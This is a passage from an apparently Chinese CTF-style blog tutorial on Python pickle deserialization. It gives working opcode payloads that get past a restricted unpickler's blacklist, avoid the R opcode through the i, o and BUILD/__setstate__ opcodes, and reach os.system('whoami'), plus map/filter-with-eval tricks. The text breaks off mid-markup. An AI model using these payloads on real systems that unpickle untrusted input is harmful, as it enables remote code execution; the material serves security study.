class="line"><span class="string">b&#x27;\x80\x03cbuiltins\ngetattr\nq\x00cbuiltins\ndict\nq\x01X\x03\x00\x00\x00getq\x02\x86q\x03Rq\x04.&#x27;</span></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">3</span></span><br><span class="line">    <span class="number">2</span>: c    GLOBAL     <span class="string">&#x27;builtins getattr&#x27;</span></span><br><span class="line">   <span class="number">20</span>: q    BINPUT     <span class="number">0</span></span><br><span class="line">   <span class="number">22</span>: c    GLOBAL     <span class="string">&#x27;builtins dict&#x27;</span></span><br><span class="line">   <span class="number">37</span>: q    BINPUT     <span class="number">1</span></span><br><span class="line">   <span class="number">39</span>: X    BINUNICODE <span class="string">&#x27;get&#x27;</span></span><br><span class="line">   <span class="number">47</span>: q    BINPUT     <span class="number">2</span></span><br><span class="line">   <span class="number">49</span>: \x86 TUPLE2</span><br><span class="line">   <span class="number">50</span>: q    BINPUT     <span class="number">3</span></span><br><span class="line">   <span class="number">52</span>: R    REDUCE</span><br><span class="line">   <span class="number">53</span>: q    BINPUT     <span class="number">4</span></span><br><span class="line">   <span class="number">55</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">2</span></span><br></pre></td></tr></table></figure><p>其中有很多<code>q\0xn</code>字节码，<code>q\xnn</code>这样的序列表示对之前保存的对象的一个引用,去掉也是可以的</p><p>构造出pickle.loads()函数:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&quot;\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS&#x27;pickle&#x27;\ntRS&#x27;loads&#x27;\ntR.&quot;</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(opcode))</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function loads&gt;</span><br></pre></td></tr></table></figure><p>接着我们生成要执行的Payload:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Command</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        command=<span class="string">&quot;whoami&quot;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(command,))</span><br><span class="line"> </span><br><span class="line">op=Command()</span><br><span class="line">opcode=pickle.dumps(op,protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="string">b&#x27;cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.&#x27;</span></span><br></pre></td></tr></table></figure><p>由于loads()函数接受的是byte类型参数，为了方便构造，我们先手动看一下<code>pickle.loads(payload)</code>的字节码，方便我们后续构造:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">bin</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (pickle.loads,(<span class="string">b&#x27;&#x27;&#x27;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&#x27;&#x27;&#x27;</span>,))</span><br><span class="line"> </span><br><span class="line">b=<span class="built_in">bin</span>()</span><br><span class="line"><span class="comment"># b=b&#x27;abcdef&#x27;</span></span><br><span class="line">opcode=pickle.dumps(b,protocol=<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line"><span class="string">b&quot;\x80\x03c_pickle\nloads\nq\x00C\x19cos\nsystem\n(S&#x27;whoami&#x27;\ntR.q\x01\x85q\x02Rq\x03.&quot;</span></span><br><span class="line">    <span class="number">0</span>: \x80 PROTO      <span class="number">3</span></span><br><span class="line">    <span class="number">2</span>: c    GLOBAL     <span class="string">&#x27;_pickle loads&#x27;</span></span><br><span class="line">   <span class="number">17</span>: q    BINPUT     <span class="number">0</span></span><br><span class="line">   <span class="number">19</span>: C    SHORT_BINBYTES <span class="string">b&quot;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&quot;</span></span><br><span class="line">   <span class="number">46</span>: q    BINPUT     <span class="number">1</span></span><br><span class="line">   <span class="number">48</span>: \x85 TUPLE1</span><br><span class="line">   <span class="number">49</span>: q    BINPUT     <span class="number">2</span></span><br><span class="line">   <span class="number">51</span>: R    REDUCE</span><br><span class="line">   <span class="number">52</span>: q    BINPUT     <span class="number">3</span></span><br><span class="line">   <span class="number">54</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">3</span></span><br></pre></td></tr></table></figure><p>这里使用了字节码<code>C</code>代表byte类型，然后后面跟上数据长度的十六进制即可，我们将C\x19cos\nsystem\n(S’whoami’\ntR.<code>和上文构造好的</code>pickle.loads()&#96;函数合并即可，完整payload如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">opcode=b&quot;\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS&#x27;pickle&#x27;\ntRS&#x27;loads&#x27;\ntRC\x19cos\nsystem\n(S&#x27;whoami&#x27;\ntR.\x85R.&quot;</span><br></pre></td></tr></table></figure><p>测试绕过:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> builtins</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RestrictedUnpickler</span>(pickle.Unpickler):</span><br><span class="line">    blacklist = &#123;<span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;exec&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;__import__&#x27;</span>, <span class="string">&#x27;exit&#x27;</span>&#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">find_class</span>(<span class="params">self, module, name</span>):</span><br><span class="line">        <span class="comment"># Only allow safe classes from builtins.</span></span><br><span class="line">        <span class="keyword">if</span> module == <span class="string">&quot;builtins&quot;</span> <span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> self.blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(builtins, name)</span><br><span class="line">        <span class="comment"># Forbid everything else.</span></span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> %</span><br><span class="line">                                     (module, name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restricted_loads</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"> </span><br><span class="line">opcode2=opcode=<span class="string">b&quot;\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS&#x27;pickle&#x27;\ntRS&#x27;loads&#x27;\ntRC\x19cos\nsystem\n(S&#x27;whoami&#x27;\ntR.\x85R.&quot;</span></span><br><span class="line">restricted_loads(opcode2)</span><br><span class="line"> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>同理 pker输入：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">funcglob=GLOBAL(<span class="string">&quot;builtins&quot;</span>,<span class="string">&quot;globals&quot;</span>)</span><br><span class="line">glob=funcglob()</span><br><span class="line"><span class="built_in">dict</span>=GLOBAL(<span class="string">&quot;builtins&quot;</span>,<span class="string">&quot;dict&quot;</span>)</span><br><span class="line"><span class="built_in">getattr</span>=GLOBAL(<span class="string">&quot;builtins&quot;</span>,<span class="string">&quot;getattr&quot;</span>)</span><br><span class="line">get=<span class="built_in">getattr</span>(<span class="built_in">dict</span>,<span class="string">&quot;get&quot;</span>)</span><br><span class="line">pickle=get(glob,<span class="string">&quot;pickle&quot;</span>)</span><br><span class="line">loads=<span class="built_in">getattr</span>(pickle,<span class="string">&quot;loads&quot;</span>)</span><br><span class="line">loads(<span class="string">&quot;bytestr&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&quot;cbuiltins\nglobals\np0\n0g0\n(tRp1\n0cbuiltins\ndict\np2\n0cbuiltins\ngetattr\np3\n0g3\n(g2\nS&#x27;get&#x27;\ntRp4\n0g4\n(g1\nS&#x27;pickle&#x27;\ntRp5\n0g3\n(g5\nS&#x27;loads&#x27;\ntRp6\n0g6\n(S&#x27;bytestr&#x27;\ntR&quot;</span></span><br></pre></td></tr></table></figure><p>这里需要把生成的opcode的<code>S&#39;bytestr&#39;</code>改成byte字符串,用了<code>B</code></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&quot;cbuiltins\nglobals\np0\n0g0\n(tRp1\n0cbuiltins\ndict\np2\n0cbuiltins\ngetattr\np3\n0g3\n(g2\nS&#x27;get&#x27;\ntRp4\n0g4\n(g1\nS&#x27;pickle&#x27;\ntRp5\n0g3\n(g5\nS&#x27;loads&#x27;\ntRp6\n0g6\n(B\x0E\x00\x00\x00youropcodehere\ntR&quot;</span></span><br></pre></td></tr></table></figure><h4 id="绕过R指令"><a href="#绕过R指令" class="headerlink" title="绕过R指令"></a>绕过R指令</h4><p>以上方法虽然能够绕过对<code>module</code>和一些危险函数的限制，但本质上仍然是对<code>__reduce__</code>函数的延伸。倘若将字节码<code>R</code>也禁用了，那我们怎么进行RCE呢？</p><p>如果你还记得我上文所说的pickle漏洞命令执行的几种方法的话，你肯定能立即想到和函数执行有关的字节码<code>R</code>、<code>i</code>、<code>o</code>。实际上，如果没有<code>R</code>指令，我们同样能够进行函数执行。有下面这样一个例子</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> stao</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, category</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no reduce!&#x27;</span></span><br><span class="line">    x=pickle.loads(data)</span><br><span class="line">    <span class="keyword">if</span>(x!= Animal(stao.name,stao.age)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;not equal&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;well done! &#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(stao.name,stao.age))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#stao.py</span></span><br><span class="line"> </span><br><span class="line">name=<span class="string">&quot;stao&quot;</span></span><br><span class="line">age=<span class="number">18</span></span><br></pre></td></tr></table></figure><p>这里禁用了R指令，但是我们仍有方法初始化一个Animal对象。我在上文提到过，使用R指令实例化对象的过程，实际上就是调用构造函数的过程，本质上也是函数执行，所以我们同样能够使用其他指令绕过。</p><h5 id="i指令"><a href="#i指令" class="headerlink" title="i指令"></a>i指令</h5><p>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(S&#x27;stao&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="o指令"><a href="#o指令" class="headerlink" title="o指令"></a>o指令</h5><p>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">S&#x27;stao&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>假如这里我们不知道<code>stao</code>模块的内容，我们可以通过变量覆盖的方式将原有stao中的变量覆盖掉。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">stao</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&#x27;Hacker&#x27;</span></span><br><span class="line"><span class="string">S&#x27;age&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">db(c__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">S&#x27;Hacker&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h5 id="b指令"><a href="#b指令" class="headerlink" title="b指令"></a>b指令</h5><p>实我们在上文已经使用过了<code>b</code>指令，当时他的作用是用来更新栈上的一个字典进行变量覆盖。实际上官方对它的解释是<code>BUILD</code>，当PVM解析到<code>b</code>指令时执行<code>__setstate__</code>或者<code>__dict__.update()</code>。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">BUILD          = <span class="string">b&#x27;b&#x27;</span>   <span class="comment"># call __setstate__ or __dict__.update()</span></span><br></pre></td></tr></table></figure><p>那什么是<code>__setstate__</code>呢？官方文档中，如果想要存储对象的状态，就可以使用<code>__getstat__</code>和<code>__setstat__</code>方法。</p><p><strong>被反序列化时调用<code>__setstate__</code>，被序列化时调用<code>__getstate__</code>。重写时可以省略<code>__setstate__</code>，但<code>__getstate__</code>必须返回一个字典。如果<code>__getstate__</code>与<code>__setstate__</code>都被省略, 那么就默认自动保存和加载对象的属性字典<code>__dict__</code>。</strong></p><p>由于<em>pickle</em>同样可以存储对象属性的状态，所以这两个魔术方法主要是针对那些不可被序列化的状态，如一个被打开的文件句柄<code>open(file,&#39;r&#39;)</code>。</p><p>我们来看下面的例子</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age=<span class="number">0</span></span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;name: <span class="subst">&#123;self.name&#125;</span>\nage: <span class="subst">&#123;self.age&#125;</span>&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span>(<span class="title class_ inherited__">Person</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, state</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;invoke __setstate__&quot;</span>)</span><br><span class="line">        self.name=state</span><br><span class="line">        self.age=<span class="number">10</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;invoke __getstate__&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Child&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">c1=Child(<span class="string">&quot;TEST&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(c1)</span><br><span class="line"><span class="comment">#name: TEST</span></span><br><span class="line"><span class="comment">#age: 0</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">opcode=pickle.dumps(c1,protocol=<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(opcode)</span><br><span class="line"><span class="comment">#invoke __getstate__</span></span><br><span class="line"><span class="comment">#b&#x27;ccopy_reg\n_reconstructor\np0\n(c__main__\nChild\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\nVChild\np5\nb.&#x27;</span></span><br><span class="line"> </span><br><span class="line">c2=pickle.loads(opcode)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"><span class="comment">#invoke __setstate__</span></span><br><span class="line"><span class="comment">#name: Child</span></span><br><span class="line"><span class="comment">#age: 10</span></span><br></pre></td></tr></table></figure><p>当对象被序列化时调用<code>__getstate__</code>，被反序列化时调用<code>__setstate__</code>。重写时可以省略<code>__setstate__</code>，但<code>__getstate__</code>必须返回一个字典。如果<code>__getstate__</code>与<code>__setstate__</code>都被省略, 那么就默认自动保存和加载对象的属性字典<code>__dict__</code>。</p><p><strong>在pickle源码中，字节码<code>b</code>对应的是<code>load_build()</code>函数</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">load_build</span>(<span class="params">self</span>):</span><br><span class="line">    stack = self.stack</span><br><span class="line">    state = stack.pop()</span><br><span class="line">    <span class="comment">#首先获取栈上的字节码b前的一个元素，对于对象来说，该元素一般是存储有对象属性的dict</span></span><br><span class="line">    inst = stack[-<span class="number">1</span>]</span><br><span class="line">    <span class="comment">#获取该字典中键名为&quot;__setstate__&quot;的value</span></span><br><span class="line">    setstate = <span class="built_in">getattr</span>(inst, <span class="string">&quot;__setstate__&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="comment">#如果存在，则执行value(state)</span></span><br><span class="line">    <span class="keyword">if</span> setstate <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        setstate(state)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    slotstate = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(state, <span class="built_in">tuple</span>) <span class="keyword">and</span> <span class="built_in">len</span>(state) == <span class="number">2</span>:</span><br><span class="line">        state, slotstate = state</span><br><span class="line">    <span class="comment">#如果&quot;__setstate__&quot;为空，则state与对象默认的__dict__合并，这一步其实就是将序列化前保存的持久化属性和对象属性字典合并</span></span><br><span class="line">    <span class="keyword">if</span> state:</span><br><span class="line">        inst_dict = inst.__dict__</span><br><span class="line">        intern = sys.intern</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> state.items():</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">type</span>(k) <span class="keyword">is</span> <span class="built_in">str</span>:</span><br><span class="line">                inst_dict[intern(k)] = v</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                inst_dict[k] = v</span><br><span class="line">    <span class="comment">#如果__setstate__和__getstate__都没有设置，则加载默认__dict__</span></span><br><span class="line">    <span class="keyword">if</span> slotstate:</span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> slotstate.items():</span><br><span class="line">            <span class="built_in">setattr</span>(inst, k, v)</span><br><span class="line">dispatch[BUILD[<span class="number">0</span>]] = load_build</span><br></pre></td></tr></table></figure><p>那么这有什么安全问题呢？如果我们将字典<code>&#123;&quot;__setstate__&quot;:os.system&#125;</code>，压入栈中，并执行<code>b</code>字节码，，由于此时并没有<code>__setstate__</code>，所以这里b字节码相当于执行了<code>__dict__.update</code>，向对象的属性字典中添加了一对新的键值对。如果我们继续向栈中压入命令command，再次执行<code>b</code>字节码时，由于已经有了<code>__setstate__</code>，所以会将栈中字节码<code>b</code>的前一个元素当作<code>state</code>，执行<code>__setstate__(state)</code>，也就是<code>os.system(command)</code>。</p><p>Payload如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">S&#x27;Casual&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">o&#125;(S&quot;__setstate__&quot;    #向栈中压入一个空字典，然后再通过u修改为&#123;&quot;__setstate__&quot;:os.system&#125;</span></span><br><span class="line"><span class="string">cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">ubS&quot;whoami&quot;</span></span><br><span class="line"><span class="string">b.&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>执行结果如下，成功RCE</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> stao</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"> </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Animal</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, category</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.category = category</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__eq__</span>(<span class="params">self, other</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span> Animal <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.category == other.category</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no reduce!&#x27;</span></span><br><span class="line">    x=pickle.loads(data)</span><br><span class="line">    <span class="keyword">if</span>(x!= Animal(stao.name,stao.age)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;not equal&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;well done! &#123;&#125; &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(stao.name,stao.age))</span><br><span class="line"> </span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;(c__main__</span></span><br><span class="line"><span class="string">Animal</span></span><br><span class="line"><span class="string">S&#x27;Casual&#x27;</span></span><br><span class="line"><span class="string">I18</span></span><br><span class="line"><span class="string">o&#125;(S&quot;__setstate__&quot;</span></span><br><span class="line"><span class="string">cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">ubS&quot;whoami&quot;</span></span><br><span class="line"><span class="string">b.&#x27;&#x27;&#x27;</span></span><br><span class="line">check(opcode)</span><br><span class="line">pickletools.dis(opcode)</span><br><span class="line"> </span><br><span class="line"><span class="comment">###</span></span><br><span class="line">xiaoh\<span class="number">34946</span></span><br><span class="line"><span class="keyword">not</span> equal</span><br><span class="line">    <span class="number">0</span>: (    MARK</span><br><span class="line">    <span class="number">1</span>: c        GLOBAL     <span class="string">&#x27;__main__ Animal&#x27;</span></span><br><span class="line">   <span class="number">18</span>: S        STRING     <span class="string">&#x27;Casual&#x27;</span></span><br><span class="line">   <span class="number">28</span>: I        INT        <span class="number">18</span></span><br><span class="line">   <span class="number">32</span>: o        OBJ        (MARK at <span class="number">0</span>)</span><br><span class="line">   <span class="number">33</span>: &#125;    EMPTY_DICT</span><br><span class="line">   <span class="number">34</span>: (    MARK</span><br><span class="line">   <span class="number">35</span>: S        STRING     <span class="string">&#x27;__setstate__&#x27;</span></span><br><span class="line">   <span class="number">51</span>: c        GLOBAL     <span class="string">&#x27;os system&#x27;</span></span><br><span class="line">   <span class="number">62</span>: u        SETITEMS   (MARK at <span class="number">34</span>)</span><br><span class="line">   <span class="number">63</span>: b    BUILD</span><br><span class="line">   <span class="number">64</span>: S    STRING     <span class="string">&#x27;whoami&#x27;</span></span><br><span class="line">   <span class="number">74</span>: b    BUILD</span><br><span class="line">   <span class="number">75</span>: .    STOP</span><br><span class="line">highest protocol among opcodes = <span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="python内置函数绕过"><a href="#python内置函数绕过" class="headerlink" title="python内置函数绕过"></a>python内置函数绕过</h4><p>这一部分就是考验 python 的基础了，题目的话可以参考 美团CTF 2022 ezpickle 和 蓝帽杯2022 file_session</p><p>Python 解释器内置了很多函数和类型，任何时候都能使用。以下按字母顺序给出列表。</p><p><img src="https://bu.dusays.com/2024/05/13/6641a598e85d4.png" alt="image-20240321204655011"></p><p>不只是上文我们用的eval open等危险函数</p><p>还有一些其他函数可以进行命令执行</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">map</span>.__new__(<span class="built_in">map</span>, <span class="built_in">eval</span>, [<span class="string">&#x27;print(\&#x27;map\&#x27;)&#x27;</span>]):  </span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">filter</span>.__new__(<span class="built_in">filter</span>, <span class="built_in">eval</span>, [<span class="string">&#x27;print(\&#x27;filter\&#x27;)&#x27;</span>]):  </span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>如上，但是这里是有一点问题的，这两个函数构建一个新的迭代器</p><p><img src="https://bu.dusays.com/2024/05/13/6641a5988fc51.png" alt="image-20240321205013186"></p><p>这里构建的迭代器是不会立即触发的，在 python 中叫懒惰，我们需要再对迭代对象进行一步 <code>__next__</code> 才能将他触发</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">r = <span class="built_in">map</span>(<span class="built_in">eval</span>, [<span class="string">&#x27;print(\&#x27;1\&#x27;)&#x27;</span>])</span><br><span class="line">r.__next__()</span><br><span class="line"></span><br><span class="line">r = <span class="built_in">filter</span>(<span class="built_in">eval</span>, [<span class="string">&#x27;print(\&#x27;2\&#x27;)&#x27;</span>])</span><br><span class="line">r.__next__()</span><br></pre></td></tr></table></figure><p><img src="https://bu.dusays.com/2024/05/13/6641a59836c26.png" alt="image-20240321205234761"></p><p>而 <code>__next__</code> 我们可以对他进行一个跟踪，看文档就可以</p><p><img src="https://bu.dusays.com/2024/05/13/6641a5983df85.png" alt="image-20240321205305266"></p><p>Python&#x2F;C API 中 Python 对象类型结构体的 <a href="https://docs.python.org/zh-cn/3/c-api/typeobj.html#c.PyTypeObject.tp_iternext"><code>tp_iternext</code></a> 槽位</p><p><img src="https://bu.dusays.com/2024/05/13/6641a59864754.png" alt="image-20240321205341056"></p><p>可以看到最下面，这里实际上也就是对应着 <code>PyIter_Next</code></p><p>PyIter_Next:</p><p><img src="https://bu.dusays.com/2024/05/13/6641a5985c738.png" alt="image-20240321205452655"></p><p>我们现在想要构造一个能够被调用的 pickle 反序列化的 payload 的时候，触发的方式就不能是再在后面拼接 <code>__next__()</code> 了，我们需要找一个能够触发 <code>PyIter_Next</code> 的方法：</p><blockquote><p>类的<code>__new__()</code>构造方法:</p><p>着重注意这个操作符:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NEWOBJ = b&#x27;\x81&#x27;#(这个很有用)  #从栈中弹出两次变量,第一次弹出的变量记为var1,第二次弹出的变量记为var2,然后就会通过cls.__new__(var2, *var1)生成实例化对象,然后将生成的对象压栈</span><br></pre></td></tr></table></figure><p>他是可以触发类的<code>__new__()</code>函数的,所以在某些时候可以寻找可用的<code>__new__()</code>方法进行绕过.在下一个方法中,我们正是用了这一点才代替<code>__next__()</code>方法进行迭代.</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bytes</span>.__new__(<span class="built_in">bytes</span>, <span class="built_in">map</span>.__new__(<span class="built_in">map</span>, <span class="built_in">eval</span>, [<span class="string">&#x27;print(1)&#x27;</span>]))  <span class="comment"># bytes_new-&gt;PyBytes_FromObject-&gt;_PyBytes_FromIterator-&gt;PyIter_Next</span></span><br><span class="line"><span class="built_in">tuple</span>.__new__(<span class="built_in">tuple</span>, <span class="built_in">map</span>.__new__(<span class="built_in">map</span>, <span class="built_in">exec</span>, [<span class="string">&quot;print(&#x27;1&#x27;)&quot;</span>]))  <span class="comment"># tuple_new_impl-&gt;PySequence_Tuple-&gt;PyIter_Next</span></span><br></pre></td></tr></table></figure><p>也就是:</p><figure class="highlight python"><table><tr><td 